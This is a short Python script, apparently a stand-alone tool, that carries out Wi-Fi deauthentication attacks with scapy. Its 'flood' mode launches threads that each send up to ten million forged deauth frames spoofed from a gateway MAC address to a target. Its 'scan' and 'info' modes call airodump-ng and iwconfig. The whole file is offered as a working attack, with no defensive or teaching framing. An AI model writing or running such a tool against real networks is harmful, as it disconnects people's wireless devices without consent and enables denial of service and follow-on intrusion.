from scapy.all import *
from threading import Thread
import argparse
import os
import time
import termcolor

parser = argparse.ArgumentParser(description="Deauth attack script using scapy")
parser.add_argument('-t','--target', type=str, metavar="",required=False,help="Target's mac address.")
parser.add_argument('-g','--gateway', type=str, metavar="",required=True,help="Gateway mac address.")
parser.add_argument('-i','--interface', type=str, metavar="",help="Set the interface of the net hardware.")
parser.add_argument('-T','--threads', type=int, metavar="",help="Set the target's mac-address.")
parser.add_argument('-m','--mode', type=str, metavar="",help="info, flood, scan.")

args = parser.parse_args()

target_mac = str(args.target)
gateway_mac = str(args.gateway)
interface = str(args.interface)

def flood():
	dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
	sendp(packet, inter=0.1, count=10000000, iface=interface, verbose=1)

	
if args.mode == "scan":
	print(termcolor.colored("Scanning ...",'red'))
	time.sleep(5)
	os.system(f"airodump-ng {args.interface}")

elif args.mode == "flood":
	try:
		for x in range (int(args.threads)):
			Thread(target=flood).start()
	except Exception as e:
		print(e)


elif args.mode == "info":
	print(termcolor.colored("To turn on the monitor mode you can use the command shown below","red"))
	time.sleep(5)
	os.system("iwconfig")
	
